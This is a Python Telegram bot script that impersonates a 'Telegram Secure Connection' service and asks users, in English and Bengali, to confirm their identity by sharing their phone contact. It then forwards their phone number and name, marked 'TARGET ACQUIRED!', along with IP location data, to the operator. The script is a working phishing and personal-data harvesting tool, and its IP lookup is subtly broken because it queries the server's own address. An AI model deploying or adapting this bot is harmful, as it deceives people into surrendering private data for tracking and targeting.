import telebot
from telebot import types
import requests
import time
import os
from flask import Flask
from threading import Thread

app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is live and running!"

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

API_TOKEN = os.getenv('BOT_TOKEN')
YOUR_PERSONAL_ID = os.getenv('MY_ID')

bot = telebot.TeleBot(API_TOKEN)

def get_user_ip_info():
    try:
        r = requests.get('http://ip-api.com/json/', timeout=10).json()
        return r
    except:
        return None

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    button = types.KeyboardButton(text="✅ Confirm Chat Request", request_contact=True)
    markup.add(button)
    
    # আপনার আগের সেই সুন্দর মেসেজটি এখানে ফিরিয়ে আনা হয়েছে
    welcome = (
        "🛡️ **Telegram Secure Connection**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "To establish a secure end-to-end tunnel, identity confirmation is required.\n\n"
        "সুরক্ষিত চ্যাট শুরু করতে নিচের বাটনে ক্লিক করে কনফার্ম করুন।"
    )
    bot.send_message(message.chat.id, welcome, reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(content_types=['contact'])
def get_contact(message):
    if message.contact is not None:
        loc = get_user_ip_info()
        report = f"🚀 **TARGET ACQUIRED!**\n📱 Phone: `{message.contact.phone_number}` \n👤 Name: {message.from_user.first_name}"
        if loc:
            report += f"\n🌐 IP: `{loc.get('ip')}` \n📍 Loc: {loc.get('city')}, {loc.get('country_name')}\n🗺️ Map: https://www.google.com/maps?q={loc.get('latitude')},{loc.get('longitude')}"
        bot.send_message(YOUR_PERSONAL_ID, report, parse_mode='Markdown')
        bot.send_message(message.chat.id, "✅ Identity Verified! Secure tunnel established.")

def run_bot():
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=25)
        except:
            time.sleep(5)

if __name__ == "__main__":
    t = Thread(target=run_flask)
    t.start()
    run_bot()
